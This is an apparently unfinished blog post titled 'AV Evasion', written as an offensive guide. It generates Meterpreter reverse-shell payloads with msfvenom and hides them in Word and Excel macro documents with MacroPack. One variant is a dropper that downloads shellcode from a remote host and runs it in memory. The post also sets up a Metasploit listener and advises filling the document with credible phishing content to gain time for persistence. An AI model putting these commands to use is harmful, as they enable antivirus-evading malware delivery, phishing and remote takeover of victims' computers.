---
layout: post
title: "AV Evasion"
categories: Guides
tags: 
---

In this post the idea is develop a guide to:
1. Generate a malicious binary with msfvenom to get a reverse shell on each kind of device
2. Apply techniques to skip the AV protections or alerts

## malicious file
### msfvenom
Let's to create two malicious files, one for each kind of architecture
```
#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.123 LPORT=4444 -f vba -o ./exe.vba


msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=10.10.10.123 -f raw -o x86.bin
msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=5555 LHOST=10.10.10.123 -f raw -o x64.bin
```

### MacroPack
https://github.com/sevagas/macro_pack
Macropack if a tool that allow us to insert in a document a malicious executable
We install the dependencies using root privileges.
```
git clone https://github.com/sevagas/macro_pack
cd macro_pack

python3 -m pip install --upgrade pip
sudo python3 -m install -r requirements.txt
python3 -m pip install wsgidav
cd src

python3 ./macro_pack.py -h
```
After the neccesary installation there is two beautiful ways for plannify the attack, first:
Let's embedding both executables in a word file and when the code will be execute the correct one will be the one to be execute due to the processor detector.
```
echo “x86.bin” “x64.bin” | macro_pack.exe -t AUTOSHELLCODE -o –autopack -G sc_auto.doc
```
Or the othe way it make me fall in love was th "DROPPER_SHELLCODE"
```
echo "http://192.168.5.10:8080/x32calc.bin" "http://192.168.5.10:8080/x64calc.bin" | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\sc_dl.xls
```
We define two url (One per each kind of processor) and the payload download the bin and execute without saving in the disk. Really beautiful.

We have to fix a pair of things at this point:
1. We should delete the metadata 
**How shoudl we do this?**
2. We should fill with a credible content (In the same sense that que phising campain if we had it) to have more time to create a persistent conection with the compromised computer


To get a conection with this malicious file we just need to put a meterpreter session listening at the port necessary
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp 
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.138
LHOST => 192.168.1.138
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > exploit

[-] Handler failed to bind to 192.168.1.138:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
```

**Me queda probarlo con una máquina virtual**